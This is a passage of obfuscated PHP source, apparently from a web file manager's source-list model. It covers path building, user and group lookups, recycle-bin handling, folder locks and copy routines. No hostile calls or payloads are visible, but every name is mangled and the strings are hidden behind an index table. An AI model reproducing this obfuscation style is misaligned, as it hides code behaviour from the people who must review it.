$öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[472]] & $ã¸­ö×[$•º’¡Î[471]][$•º’¡Î[471]]; } continue; } $£‰î§£÷ = $this->parentLevelArray($öÀ¾ï‚[$•º’¡Î[568]]); $Û¼¡ÇŒĞ = array_reverse($£‰î§£÷); foreach ($Û¼¡ÇŒĞ as $£é”–äş => $Õ’§í¸è) { if (!isset($‰Ù˜«ç£[$Õ’§í¸è])) { continue; } $ã¸­ö× = $‰Ù˜«ç£[$Õ’§í¸è]; $öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[564]] = $ã¸­ö×; if ($ã¸­ö×[$•º’¡Î[511]] != $ª•ëèâÇ) { $öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[472]] = $öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[472]] & $ã¸­ö×[$•º’¡Î[471]][$•º’¡Î[471]]; } $³Ã³ñä¸ = $•º’¡Î[12]; $‰ñ¹¿°Ë = count($£‰î§£÷) - $£é”–äş; for ($ ²ùÚùş = 0; $ ²ùÚùş < $‰ñ¹¿°Ë; $ ²ùÚùş++) { if (!isset($éÄŸ“ó[$£‰î§£÷[$ ²ùÚùş]])) { $³Ã³ñä¸ = $•º’¡Î[12]; break; } $³Ã³ñä¸ = $³Ã³ñä¸ . rtrim($éÄŸ“ó[$£‰î§£÷[$ ²ùÚùş]], $•º’¡Î[8]) . $•º’¡Î[8]; } $öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[565]] = rtrim($³Ã³ñä¸, $•º’¡Î[8]) . $•º’¡Î[8]; break; } } unset($öÀ¾ï‚); } public function groupPathDisplay(&$®ËÇ®·) { $Ä¤€…ìç =& $_SERVER[÷åé¼î]; if ($®ËÇ®·[$Ä¤€…ìç[190]] != self::TYPE_GROUP) { return; } $Çíá¡—¯ = Model($Ä¤€…ìç[569])->getInfo($®ËÇ®·[$Ä¤€…ìç[553]]); $å–Ğ”éˆ = $this->parentLevelArray($Çíá¡—¯[$Ä¤€…ìç[568]]); $ËùÚÍ = $Ä¤€…ìç[12]; foreach ($å–Ğ”éˆ as $Ù£°—‹¶) { $ÊÒœø™È = Model($Ä¤€…ìç[569])->getInfo($Ù£°—‹¶); $ËùÚÍ .= $ÊÒœø™È[$Ä¤€…ìç[90]][$Ä¤€…ìç[193]] . $Ä¤€…ìç[50]; } $®ËÇ®·[$Ä¤€…ìç[570]] = $Çíá¡—¯[$Ä¤€…ìç[192]]; $®ËÇ®·[$Ä¤€…ìç[571]] = $Çíá¡—¯[$Ä¤€…ìç[568]]; $®ËÇ®·[$Ä¤€…ìç[572]] = $Çíá¡—¯[$Ä¤€…ìç[573]]; $®ËÇ®·[$Ä¤€…ìç[574]] = $ËùÚÍ . $Çíá¡—¯[$Ä¤€…ìç[90]][$Ä¤€…ìç[193]]; } protected function _listAppendPath(&$øÜà÷˜ø, $¹ÇèÌÀâ = false) { $Õä”â“Ü =& $_SERVER[÷åé¼î]; static $ú°£ÏœÁ = array(); $‚Ÿ¾àè— = array(); $äâ ©şÂ = array(); if ($¹ÇèÌÀâ) { return $ú°£ÏœÁ; } foreach ($øÜà÷˜ø as &$ìÂâ¨ù®) { $ãàÅ¢’ = $ìÂâ¨ù®[$Õä”â“Ü[193]]; if ($ìÂâ¨ù®[$Õä”â“Ü[469]] == $Õä”â“Ü[91] && $ìÂâ¨ù®[$Õä”â“Ü[192]] != 0) { $ú°£ÏœÁ[$ãàÅ¢’] = $ìÂâ¨ù®[$Õä”â“Ü[32]]; } if ($ìÂâ¨ù®[$Õä”â“Ü[469]] == $Õä”â“Ü[91] && $ìÂâ¨ù®[$Õä”â“Ü[192]] == 0) { $ú°£ÏœÁ[$ãàÅ¢’] = $this->_listAppendPathRoot($ìÂâ¨ù®, array()); } if (isset($äâ ©şÂ[$ìÂâ¨ù®[$Õä”â“Ü[568]]])) { continue; } $äâ ©şÂ[$ìÂâ¨ù®[$Õä”â“Ü[568]]] = !0; $ç‘Ë­Î• = $this->parentLevelArray($ìÂâ¨ù®[$Õä”â“Ü[568]]); foreach ($ç‘Ë­Î• as $«ª•…æÑ => $‹Ñ“õ¼®) { if (isset($ú°£ÏœÁ[$‹Ñ“õ¼®])) { continue; } if ($«ª•…æÑ == 0) { $ú°£ÏœÁ[$‹Ñ“õ¼®] = $this->_listAppendPathRoot($ìÂâ¨ù®, $ç‘Ë­Î•); } if ($«ª•…æÑ != 0) { $‚Ÿ¾àè—[] = $‹Ñ“õ¼®; } } } unset($ìÂâ¨ù®); $‚Ÿ¾àè— = array_unique($‚Ÿ¾àè—); if (count($‚Ÿ¾àè—) > 0) { $ãˆŸÓı = array($Õä”â“Ü[475] => array($Õä”â“Ü[476], $‚Ÿ¾àè—)); if (count($‚Ÿ¾àè—) == 1) { $ıà…Ôªˆ = $this->sourceInfo($‚Ÿ¾àè—[0]); $ˆ¼¶»–‚ = is_array($ıà…Ôªˆ) ? array($ıà…Ôªˆ) : !1; } else { $ˆ¼¶»–‚ = $this->field($Õä”â“Ü[575])->where($ãˆŸÓı)->select(); } if (!$ˆ¼¶»–‚) { $ˆ¼¶»–‚ = array(); } foreach ($ˆ¼¶»–‚ as $ÕÎÚñ¡) { $ú°£ÏœÁ[$ÕÎÚñ¡[$Õä”â“Ü[193]]] = $ÕÎÚñ¡[$Õä”â“Ü[32]]; } } $´¯Š„÷Õ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÄÁ‘ˆ¸õ = array(); foreach ($øÜà÷˜ø as &$ìÂâ¨ù®) { $æİ’Ğ© = $ìÂâ¨ù®[$Õä”â“Ü[568]]; $¤»ùİ»¾ = $Õä”â“Ü[12]; if (isset($ÄÁ‘ˆ¸õ[$æİ’Ğ©])) { $¤»ùİ»¾ = $ÄÁ‘ˆ¸õ[$æİ’Ğ©]; } else { $ç‘Ë­Î• = $this->parentLevelArray($ìÂâ¨ù®[$Õä”â“Ü[568]]); foreach ($ç‘Ë­Î• as $«ª•…æÑ => $‹Ñ“õ¼®) { if (isset($ú°£ÏœÁ[$‹Ñ“õ¼®])) { $¤»ùİ»¾ .= $ú°£ÏœÁ[$‹Ñ“õ¼®] . $Õä”â“Ü[8]; } } $ÄÁ‘ˆ¸õ[$æİ’Ğ©] = $¤»ùİ»¾; } $¤»ùİ»¾ .= $ìÂâ¨ù®[$Õä”â“Ü[32]]; if ($ìÂâ¨ù®[$Õä”â“Ü[469]] == $Õä”â“Ü[91]) { $¤»ùİ»¾ .= $Õä”â“Ü[8]; } $ìÂâ¨ù®[$Õä”â“Ü[566]] = str_replace($Õä”â“Ü[576], $Õä”â“Ü[8], $¤»ùİ»¾); if ($ìÂâ¨ù®[$Õä”â“Ü[192]] == $Õä”â“Ü[228]) { $ìÂâ¨ù®[$Õä”â“Ü[32]] = trim($ú°£ÏœÁ[$ìÂâ¨ù®[$Õä”â“Ü[193]]], $Õä”â“Ü[8]); $ìÂâ¨ù®[$Õä”â“Ü[566]] = $ìÂâ¨ù®[$Õä”â“Ü[32]] . $Õä”â“Ü[8]; } if (intval($ìÂâ¨ù®[$Õä”â“Ü[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ìÂâ¨ù®, $ç‘Ë­Î•, $´¯Š„÷Õ); } } unset($ìÂâ¨ù®); return $øÜà÷˜ø; } private function _listAppendPathRecycle(&$öŞı™¸Ë, $¸³´™¼Ô, $üµòÜÅ) { $å¥ÇÔì =& $_SERVER[÷åé¼î]; if (!in_array($üµòÜÅ, $¸³´™¼Ô) && $öŞı™¸Ë[$å¥ÇÔì[193]] != $üµòÜÅ) { return; } $Ÿ¸ş½™Œ = explode($å¥ÇÔì[8], trim($öŞı™¸Ë[$å¥ÇÔì[566]], $å¥ÇÔì[8])); $¦û£Ğ§Õ = implode($å¥ÇÔì[8], array_slice($Ÿ¸ş½™Œ, 2)); $öŞı™¸Ë[$å¥ÇÔì[566]] = $å¥ÇÔì[8] . LNG($å¥ÇÔì[577]) . $å¥ÇÔì[8] . ltrim($¦û£Ğ§Õ, $å¥ÇÔì[8]); $öŞı™¸Ë[$å¥ÇÔì[568]] = $å¥ÇÔì[578] . implode($å¥ÇÔì[50], array_slice($¸³´™¼Ô, 1)) . $å¥ÇÔì[50]; if ($öŞı™¸Ë[$å¥ÇÔì[193]] == $üµòÜÅ) { $öŞı™¸Ë[$å¥ÇÔì[568]] = $å¥ÇÔì[578]; $öŞı™¸Ë[$å¥ÇÔì[192]] = $å¥ÇÔì[228]; $öŞı™¸Ë[$å¥ÇÔì[32]] = LNG($å¥ÇÔì[577]); } $öŞı™¸Ë[$å¥ÇÔì[579]] = $å¥ÇÔì[580]; } protected function _listAppendPathRoot(&$»Á¡ÑŞŠ, $®£ûşñå) { $öáü·Ìõ =& $_SERVER[÷åé¼î]; static $ íá¢®µ = false; $—½ƒº»ù = $öáü·Ìõ[12]; if ($»Á¡ÑŞŠ[$öáü·Ìõ[190]] == self::TYPE_USER) { if ($»Á¡ÑŞŠ[$öáü·Ìõ[553]] == USER_ID) { $—½ƒº»ù = LNG($öáü·Ìõ[581]); if ($ íá¢®µ === !1) { $•¿÷Á¾ = Model($öáü·Ìõ[582])->getInfoFull(USER_ID); $ íá¢®µ = _get($•¿÷Á¾, $öáü·Ìõ[583], $öáü·Ìõ[12]); } if ($®£ûşñå && $®£ûşñå[0] == $ íá¢®µ || !$®£ûşñå && $»Á¡ÑŞŠ[$öáü·Ìõ[193]] == $ íá¢®µ) { $—½ƒº»ù = LNG($öáü·Ìõ[584]); $»Á¡ÑŞŠ[$öáü·Ìõ[585]] = $öáü·Ìõ[586]; } if (!$®£ûşñå) { $»Á¡ÑŞŠ[$öáü·Ìõ[32]] = $—½ƒº»ù; } } else { $»Á¡ÑŞŠ[$öáü·Ìõ[587]] = Model($öáü·Ìõ[561])->getInfoSimpleOuter($»Á¡ÑŞŠ[$öáü·Ìõ[553]]); $—½ƒº»ù = LNG($öáü·Ìõ[588]) . $öáü·Ìõ[176] . $»Á¡ÑŞŠ[$öáü·Ìõ[587]][$öáü·Ìõ[32]] . $öáü·Ìõ[178]; } } else { if ($»Á¡ÑŞŠ[$öáü·Ìõ[190]] == self::TYPE_GROUP) { $ÍÊíµî = Model($öáü·Ìõ[569])->getInfoSimple($»Á¡ÑŞŠ[$öáü·Ìõ[553]]); $—½ƒº»ù = $ÍÊíµî[$öáü·Ìõ[32]]; } else { if ($»Á¡ÑŞŠ[$öáü·Ìõ[190]] == self::TYPE_SYSTEM) { $—½ƒº»ù = $öáü·Ìõ[589]; } } } $—½ƒº»ù = $—½ƒº»ù ? $öáü·Ìõ[8] . $—½ƒº»ù . $öáü·Ìõ[8] : $öáü·Ìõ[8]; return $—½ƒº»ù; } protected function _listAppendUser(&$»—ÀŸ) { $ùÅÕ“‘Á =& $_SERVER[÷åé¼î]; $Ñü¢ï» = array_to_keyvalue($»—ÀŸ, $ùÅÕ“‘Á[12], $ùÅÕ“‘Á[511]); $æïÔ²Õ = array_to_keyvalue($»—ÀŸ, $ùÅÕ“‘Á[12], $ùÅÕ“‘Á[513]); $Ÿç§éİ = array_merge($Ñü¢ï», $æïÔ²Õ); $–›Ÿ·Ôø = Model($ùÅÕ“‘Á[582])->userListInfo($Ÿç§éİ); foreach ($»—ÀŸ as &$Ÿ­¦îì„) { $„õÏ”ôˆ = $Ÿ­¦îì„[$ùÅÕ“‘Á[511]]; $Ÿ­¦îì„[$ùÅÕ“‘Á[511]] = $–›Ÿ·Ôø[$„õÏ”ôˆ] ? $–›Ÿ·Ôø[$„õÏ”ôˆ] : !1; $„õÏ”ôˆ = $Ÿ­¦îì„[$ùÅÕ“‘Á[513]]; $Ÿ­¦îì„[$ùÅÕ“‘Á[513]] = $–›Ÿ·Ôø[$„õÏ”ôˆ] ? $–›Ÿ·Ôø[$„õÏ”ôˆ] : !1; if (_get($Ÿ­¦îì„, $ùÅÕ“‘Á[590], 0)) { $Ÿ°ŠüÛ± = $GLOBALS[$ùÅÕ“‘Á[6]][$ùÅÕ“‘Á[92]][$ùÅÕ“‘Á[591]]; if ($Ÿ­¦îì„[$ùÅÕ“‘Á[523]][$ùÅÕ“‘Á[592]] <= time() - $Ÿ°ŠüÛ±) { $this->metaSet($Ÿ­¦îì„[$ùÅÕ“‘Á[193]], $ùÅÕ“‘Á[593], null); $this->metaSet($Ÿ­¦îì„[$ùÅÕ“‘Á[193]], $ùÅÕ“‘Á[592], null); unset($Ÿ­¦îì„[$ùÅÕ“‘Á[523]][$ùÅÕ“‘Á[593]]); continue; } $ÌØ“ª² = $Ÿ­¦îì„[$ùÅÕ“‘Á[523]][$ùÅÕ“‘Á[593]]; $Ÿ­¦îì„[$ùÅÕ“‘Á[523]][$ùÅÕ“‘Á[594]] = Model($ùÅÕ“‘Á[582])->getInfoSimpleOuter($ÌØ“ª²); } } unset($Ÿ­¦îì„); } public function parentLevelArray($Åò­í—í) { $Åˆäı½‹ =& $_SERVER[÷åé¼î]; $Åò­í—í = explode($Åˆäı½‹[50], trim($Åò­í—í, $Åˆäı½‹[50])); return array_remove_value($Åò­í—í, $Åˆäı½‹[228]); } public function listAll($Â£˜¬§ó) { $×™°É‚å =& $_SERVER[÷åé¼î]; $´’¶óëà = $this->sourceInfo($Â£˜¬§ó); $Å˜şŒ×ï = array($×™°É‚å[595] => array($×™°É‚å[596], $´’¶óëà[$×™°É‚å[568]] . $Â£˜¬§ó . $×™°É‚å[597]), $×™°É‚å[598] => 0); $óíõŸƒĞ = $×™°É‚å[599]; $ƒ‡Ãà¥ = "\114\105\106\124\40\112\x4f\x49\116\40{$this->tablePrefix}\x69\x6f\137\146\x69\154\x65\x20\146\x69\154\145\40\x6f\156\40\163\157\165\x72\143\x65\56\146\x69\154\145\111\x44\40\75\x20\146\151\x6c\145\x2e\x66\151\154\145\111\x44"; $Ş«îµæö = $this->alias($×™°É‚å[503])->field($óíõŸƒĞ)->where($Å˜şŒ×ï)->join($ƒ‡Ãà¥)->select(); $this->_listAppendAuth($Ş«îµæö); $this->_listAppendUser($Ş«îµæö); $this->_listAppendPath($Ş«îµæö); $Ş«îµæö = array_to_keyvalue($Ş«îµæö, $×™°É‚å[193]); $·ş·ûô¦ = "\x2f{$´’¶óëà[$×™°É‚å[32]]}\x2f"; $·ş·ûô¦ = $·ş·ûô¦ == $×™°É‚å[576] ? $×™°É‚å[8] : $·ş·ûô¦; $ÒÖÇÇ©„ = array(); foreach ($Ş«îµæö as $Å¥úüœô => $ÖâºÏ‚‚) { $Ç¯ñº ñ = $this->parentLevelArray($ÖâºÏ‚‚[$×™°É‚å[568]]); array_shift($Ç¯ñº ñ); $® øä°¤ = $·ş·ûô¦; for ($ëüÄï‚‹ = 0; $ëüÄï‚‹ < count($Ç¯ñº ñ); $ëüÄï‚‹++) { $® øä°¤ .= $Ş«îµæö[$Ç¯ñº ñ[$ëüÄï‚‹]][$×™°É‚å[32]] . $×™°É‚å[8]; } $® øä°¤ .= $ÖâºÏ‚‚[$×™°É‚å[32]]; if ($ÖâºÏ‚‚[$×™°É‚å[469]]) { $® øä°¤ .= $×™°É‚å[8]; } $àŒ“‡—— = array($×™°É‚å[479] => str_replace($×™°É‚å[576], $×™°É‚å[8], str_replace($×™°É‚å[576], $×™°É‚å[8], str_replace($×™°É‚å[576], $×™°É‚å[8], $® øä°¤))), $×™°É‚å[600] => intval($ÖâºÏ‚‚[$×™°É‚å[469]]), $×™°É‚å[601] => intval($ÖâºÏ‚‚[$×™°É‚å[79]]), $×™°É‚å[88] => intval($ÖâºÏ‚‚[$×™°É‚å[88]]), $×™°É‚å[90] => $this->pathInfoFilter($ÖâºÏ‚‚)); if (!$àŒ“‡——[$×™°É‚å[469]]) { $àŒ“‡——[$×™°É‚å[525]] = $ÖâºÏ‚‚[$×™°É‚å[525]]; } $ÒÖÇÇ©„[] = $àŒ“‡——; } $ÒÖÇÇ©„ = array_sort_by($ÒÖÇÇ©„, $×™°É‚å[87]); return $ÒÖÇÇ©„; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Úçç¾¼) { $ÇÄçŒ÷ =& $_SERVER[÷åé¼î]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÇÄçŒ÷[602], $Úçç¾¼); $ êÅ§’ = 1; $this->_lockEvent($Úçç¾¼, array($ÇÄçŒ÷[603], $ÇÄçŒ÷[604]), $ êÅ§’); $this->_lockParent($Úçç¾¼, array($ÇÄçŒ÷[604]), $ êÅ§’); $this->_lockEvent($Úçç¾¼, array($ÇÄçŒ÷[605], $ÇÄçŒ÷[606]), $ êÅ§’); $this->_lockCheckEnd($ÇÄçŒ÷[602], $Úçç¾¼); } public function lockCopyEnd($©Îöëˆ) { $¬çÅ©å =& $_SERVER[÷åé¼î]; if (!$this->allowLock()) { return; } $şÕ¨§à = 0; $this->_lockEvent($©Îöëˆ, array($¬çÅ©å[603], $¬çÅ©å[604]), $şÕ¨§à); $this->_lockParent($©Îöëˆ, array($¬çÅ©å[604]), $şÕ¨§à); $this->_lockEvent($©Îöëˆ, array($¬çÅ©å[605], $¬çÅ©å[606]), $şÕ¨§à); } public function lockWriteStart($­¯İÕë‰, $©şËÛ¸ç = '') { $™µßô¥ç =& $_SERVER[÷åé¼î]; if (!$this->allowLock()) { return; } $this->_lockCheck($™µßô¥ç[603], $­¯İÕë‰); $ùìÓåÉß = 1; $this->_lockKey($™µßô¥ç[607] . $­¯İÕë‰ . $™µßô¥ç[10] . $©şËÛ¸ç, $ùìÓåÉß); $this->_lockEvent($­¯İÕë‰, array($™µßô¥ç[602], $™µßô¥ç[604]), $ùìÓåÉß); $this->_lockParent($­¯İÕë‰, array($™µßô¥ç[602], $™µßô¥ç[604]), $ùìÓåÉß); $this->_lockCheckEnd($™µßô¥ç[603], $­¯İÕë‰); } public function lockWriteEnd($ÅÚÙãã, $»œÔ£Êü = '') { $Ò¯àÎÚÕ =& $_SERVER[÷åé¼î]; if (!$this->allowLock()) { return; } $ÃşˆÊœ¢ = 0; $this->_lockKey($Ò¯àÎÚÕ[607] . $ÅÚÙãã . $Ò¯àÎÚÕ[10] . $»œÔ£Êü, $ÃşˆÊœ¢); $this->_lockEvent($ÅÚÙãã, array($Ò¯àÎÚÕ[602], $Ò¯àÎÚÕ[604]), $ÃşˆÊœ¢); $this->_lockParent($ÅÚÙãã, array($Ò¯àÎÚÕ[602], $Ò¯àÎÚÕ[604]), $ÃşˆÊœ¢); } public function lockMoveStart($Û’¼Âı¿) { $º¢‰Ø • =& $_SERVER[÷åé¼î]; if (!$this->allowLock()) { return; } $this->_lockCheck($º¢‰Ø •[604], $Û’¼Âı¿); $µ´©µ• = 1; $this->_lockKey($º¢‰Ø •[608] . $Û’¼Âı¿, $µ´©µ•); $this->_lockEvent($Û’¼Âı¿, array($º¢‰Ø •[602], $º¢‰Ø •[603]), $µ´©µ•); $this->_lockParent($Û’¼Âı¿, array($º¢‰Ø •[602], $º¢‰Ø •[604]), $µ´©µ•); $this->_lockEvent($Û’¼Âı¿, array($º¢‰Ø •[609], $º¢‰Ø •[605], $º¢‰Ø •[606]), $µ´©µ•); $this->_lockCheckEnd($º¢‰Ø •[604], $Û’¼Âı¿); } public function lockMoveEnd($Ÿ«€ÔÊé) { $ËÂêÛö± =& $_SERVER[÷åé¼î]; if (!$this->allowLock()) { return; } $ğÅÁ°¾‹ = 0; $this->_lockKey($ËÂêÛö±[608] . $Ÿ«€ÔÊé, $ğÅÁ°¾‹); $this->_lockEvent($Ÿ«€ÔÊé, array($ËÂêÛö±[602], $ËÂêÛö±[603]), $ğÅÁ°¾‹); $this->_lockParent($Ÿ«€ÔÊé, array($ËÂêÛö±[602], $ËÂêÛö±[604]), $ğÅÁ°¾‹); $this->_lockEvent($Ÿ«€ÔÊé, array($ËÂêÛö±[609], $ËÂêÛö±[605], $ËÂêÛö±[606]), $ğÅÁ°¾‹); } private function _lockCheck($Õ‡²ùÄÁ, $ïöŠæš) { $ÚºÄ—¸ =& $_SERVER[÷åé¼î]; $µÛì…ÜÕ = $this->sourceInfo($ïöŠæš); $ÄÁ»¹´ó = $Õ‡²ùÄÁ . $ÚºÄ—¸[10] . $ïöŠæš; $this->_lockTimeStart[$ÄÁ»¹´ó] = timeFloat(); if (!is_array($µÛì…ÜÕ)) { return; } $¢âÑ®Ë¥ = LNG($ÚºÄ—¸[610]); CacheLock::setErrorMsg($ÚºÄ—¸[176] . htmlspecialchars($µÛì…ÜÕ[$ÚºÄ—¸[32]]) . $ÚºÄ—¸[178] . $¢âÑ®Ë¥); $this->_lockKey($ÄÁ»¹´ó, 1); $this->_lockKey($ÄÁ»¹´ó, 0); $»ß€ŸËÅ = array_reverse($this->parentLevelArray($µÛì…ÜÕ[$ÚºÄ—¸[568]])); foreach ($»ß€ŸËÅ as $ŠáÑ•²ç) { $ÄÁ»¹´ó = $Õ‡²ùÄÁ . $ÚºÄ—¸[611] . $ŠáÑ•²ç; if (CacheLock::lockGet($ÚºÄ—¸[612] . $ÄÁ»¹´ó)) { $µÛì…ÜÕ = $this->sourceInfo($ŠáÑ•²ç); CacheLock::setErrorMsg($ÚºÄ—¸[176] . htmlspecialchars($µÛì…ÜÕ[$ÚºÄ—¸[32]]) . $ÚºÄ—¸[178] . $¢âÑ®Ë¥); $this->_lockKey($ÄÁ»¹´ó, 1); $this->_lockKey($ÄÁ»¹´ó, 0); } } } private function _lockCheckEnd($Š·ıôòÂ, $¢ÈÔƒ„î) { $¥Õ† È¹ =& $_SERVER[÷åé¼î]; $ê¼ùŒç× = $Š·ıôòÂ . $¥Õ† È¹[10] . $¢ÈÔƒ„î; CacheLock::setErrorMsg($¥Õ† È¹[438]); if (!isset($this->_lockTimeStart[$ê¼ùŒç×])) { return; } $‹‘Š·ô½ = timeFloat() - $this->_lockTimeStart[$ê¼ùŒç×]; unset($this->_lockTimeStart[$ê¼ùŒç×]); if ($‹‘Š·ô½ > 0.5) { unset(self::$cacheSourceInfo[$¥Õ† È¹[517] . $¢ÈÔƒ„î]); } $½î¬ÏÆ³ = $this->sourceInfo($¢ÈÔƒ„î); if (!$½î¬ÏÆ³) { show_json(LNG($¥Õ† È¹[108]), !1); } } private function _lockParent($™İ’ßÉê, $äòÖÀŠƒ, $·¶ˆÒò¾) { if (!$this->autoLockSet) { return; } $õ´ÍƒÖ = $this->sourceInfo($™İ’ßÉê); if (!is_array($õ´ÍƒÖ)) { return; } $òùóÛé = array_reverse($this->parentLevelArray($õ´ÍƒÖ[$_SERVER[÷åé¼î][568]])); foreach ($òùóÛé as $õ¥ûÎ…ù) { $this->_lockEvent($õ¥ûÎ…ù, $äòÖÀŠƒ, $·¶ˆÒò¾); } } private function _lockEvent($ğÛ¶Ó¨«, $Ûƒî¹£ü, $»ÅÍôØØ) { $ ÇÃº– =& $_SERVER[÷åé¼î]; if (!$this->autoLockSet) { return; } foreach ($Ûƒî¹£ü as $öº·™Ÿ) { $æºøµ±á = $öº·™Ÿ . $ ÇÃº–[10] . $ğÛ¶Ó¨«; if ($»ÅÍôØØ && CacheLock::lockGet($ ÇÃº–[612] . $æºøµ±á)) { continue; } $this->_lockKey($æºøµ±á, $»ÅÍôØØ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ä•ññ••, $¡£ª‡’… = 1) { $¿–âŠë = $_SERVER[÷åé¼î][612] . md5($ä•ññ••); if ($¡£ª‡’…) { if (isset(self::$_lockItemArr[$¿–âŠë])) { return; } self::$_lockItemArr[$¿–âŠë] = 1; CacheLock::lock($¿–âŠë, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¿–âŠë])) { return; } unset(self::$_lockItemArr[$¿–âŠë]); CacheLock::unlock($¿–âŠë); } } public function isParentOf($ç¦ùçô , $Ô½›“Úõ) { $”ñéÑİİ =& $_SERVER[÷åé¼î]; $­şÖº¾ = $this->sourceInfo($ç¦ùçô ); $ØƒºšÀ = $this->sourceInfo($Ô½›“Úõ); $¸ù“‘˜ = $­şÖº¾[$”ñéÑİİ[568]] . $­şÖº¾[$”ñéÑİİ[193]] . $”ñéÑİİ[50]; $êº¾ßê = $ØƒºšÀ[$”ñéÑİİ[568]] . $ØƒºšÀ[$”ñéÑİİ[193]] . $”ñéÑİİ[50]; $´‰œ¡ú½ = strpos($êº¾ßê, $¸ù“‘˜) === 0; return $´‰œ¡ú½; } private $targetIsDelete = 0; public function copy($·×š¡üò, $Š§ÃÄÌœ, $ª¹´õ” = REPEAT_REPLACE, $Ğáš«ØØ = '') { $¹½áÍæª =& $_SERVER[÷åé¼î]; $Ÿá•‰É± = $this->sourceInfo($·×š¡üò); $¸ÅñÉ’¾ = $this->sourceInfo($Š§ÃÄÌœ); if (!$Ÿá•‰É± || !$¸ÅñÉ’¾ || $¸ÅñÉ’¾[$¹½áÍæª[469]] != $¹½áÍæª[91]) { return !1; } if ($this->isParentOf($·×š¡üò, $Š§ÃÄÌœ)) { return !1; } $­…ÚŒ¾ = $Ğáš«ØØ ? $Ğáš«ØØ : $Ÿá•‰É±[$¹½áÍæª[32]]; $this->lockCopyStart($·×š¡üò); $this->lockWriteStart($Š§ÃÄÌœ, $­…ÚŒ¾); $Ì£Õ‰ˆÄ = array($¹½áÍæª[613] => array(), $¹½áÍæª[614] => array(), $¹½áÍæª[615] => array()); $this->targetIsDelete = intval($Ÿá•‰É±[$¹½áÍæª[489]]); $Ìş†¸´õ = $this->fileNameExistAuto($Š§ÃÄÌœ, $Ÿá•‰É±); $şºø½ø = $this->_copy($·×š¡üò, $Š§ÃÄÌœ, $ª¹´õ”, $Ì£Õ‰ˆÄ, !0, $Ğáš«ØØ); $this->_childrenListClear(); $this->lockCopyEnd($·×š¡üò); $this->lockWriteEnd($Š§ÃÄÌœ, $­…ÚŒ¾); if ($Ÿá•‰É±[$¹½áÍæª[469]] == $¹½áÍæª[91] && $Ìş†¸´õ == $şºø½ø) { $this->folderSizeResetChildren($Ìş†¸´õ); } Model($¹½áÍæª[616])->addAll($Ì£Õ‰ˆÄ[$¹½áÍæª[614]], array(), !0); if ($Ìş†¸´õ != $şºø½ø || $Ÿá•‰É±[$¹½áÍæª[469]] == $¹½áÍæª[91]) { Model($¹½áÍæª[617])->eventCopy($şºø½ø); } $this->saveAll($Ì£Õ‰ˆÄ[$¹½áÍæª[615]]); Model($¹½áÍæª[230])->linkAdd($Ì£Õ‰ˆÄ[$¹½áÍæª[613]]); $this->folderSizeReset($Š§ÃÄÌœ); $this->updateModifyTime($Š§ÃÄÌœ); return $şºø½ø; } private function _copy($…›öşªí, $ß»±¥÷Â, $İı—çŒÖ, &$ã¡˜÷’Ô, $ôö¨öéÖ, $ƒ“¶Ø¾û = '') { $á—ãäºó =& $_SERVER[÷åé¼î]; $õ°ÊğÙ¡ = $this->sourceInfoCache($…›öşªí); $Óå­’è© = $õ°ÊğÙ¡[$á—ãäºó[469]] == $á—ãäºó[91]; $ä¹Ô½ = $ƒ“¶Ø¾û ? $ƒ“¶Ø¾û : $õ°ÊğÙ¡[$á—ãäºó[32]]; $×ş‡¢ëÁ = $this->fileNameExistAuto($ß»±¥÷Â, $õ°ÊğÙ¡); if ($ôö¨öéÖ) { $this->_childrenAllMake($…›öşªí); if ($Óå­’è© && $×ş‡¢ëÁ) { $this->_childrenAllMake($×ş‡¢ëÁ); } } if (!$×ş‡¢ëÁ) { return $this->_copyCreate($…›öşªí, $ß»±¥÷Â, $ä¹Ô½, $ã¡˜÷’Ô); } $Ş¨ÌÄü = $×ş‡¢ëÁ; if ($Óå­’è©) { if ($İı—çŒÖ == REPEAT_RENAME_FOLDER) { $ä¹Ô½ = $this->fileNameAutoCache($ß»±¥÷Â, $ä¹Ô½, $İı—çŒÖ, $Óå­’è©); $Ş¨ÌÄü = $this->_copyCreate($…›öşªí, $ß»±¥÷Â, $ä¹Ô½, $ã¡˜÷’Ô); } else { $Ïñà’¿ = $this->_childrenList($…›öşªí); foreach ($Ïñà’¿ as $¤Úø•‘) { $this->_copy($¤Úø•‘[$á—ãäºó[193]], $×ş‡¢ëÁ, $İı—çŒÖ, $ã¡˜÷’Ô, !1); } } } else { if ($İı—çŒÖ == REPEAT_RENAME || $İı—çŒÖ == REPEAT_RENAME_FOLDER) { $ä¹Ô½ = $this->fileNameAutoCache($ß»±¥÷Â, $ä¹Ô½, $İı—çŒÖ, $Óå­’è©); $Ş¨ÌÄü = $this->_copyCreate($…›öşªí, $ß»±¥÷Â, $ä¹Ô½, $ã¡˜÷’Ô); } else { if ($İı—çŒÖ == REPEAT_REPLACE) { $êÎÅõø‹ = $this->sourceInfoCache($×ş‡¢ëÁ); $Šıó““  = $this->fileHistory($êÎÅõø‹, $õ°ÊğÙ¡[$á—ãäºó[525]], $õ°ÊğÙ¡[$á—ãäºó[79]]); if ($Šıó““ ) { $ã¡˜÷’Ô[$á—ãäºó[613]][] = $õ°ÊğÙ¡[$á—ãäºó[525]]; } } else { if ($İı—çŒÖ == REPEAT_SKIP) { } } } Hook::trigger($á—ãäºó[618], array($á—ãäºó[619], $õ°ÊğÙ¡, 0)); } return $Ş¨ÌÄü; } private function _copyCreate($ó­ê®û, $±¬ú§ç, $ïËş•ïÉ, &$îŠ˜«É) { $Û÷‚ªù¸ =& $_SERVER[÷åé¼î]; $ù”şÛªĞ = $this->sourceInfoCache($ó­ê®û); $£È„äêŠ = $this->sourceInfoCache($±¬ú§ç); $§«€Ø‘Ş = $this->_makeItemData($ù”şÛªĞ, $£È„äêŠ, $ïËş•ïÉ); Hook::trigger($Û÷‚ªù¸[620], $§«€Ø‘Ş); Hook::trigger($Û÷‚ªù¸[621], array($Û÷‚ªù¸[622], 